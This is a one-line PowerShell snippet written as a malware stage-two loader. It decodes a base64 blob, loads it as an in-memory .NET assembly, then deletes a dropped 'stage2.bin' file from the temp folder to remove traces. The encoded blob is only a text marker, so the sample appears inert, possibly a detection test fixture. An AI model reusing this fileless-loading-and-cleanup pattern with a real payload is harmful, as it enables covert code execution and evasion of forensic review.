
try { $AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo1Yjk1OXJ5bXp1'); Write-Verbose ("Assembly bytes: " + $AssemblyBytes.Length); [Reflection.Assembly]::Load($AssemblyBytes); Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Stage transfer failed" }
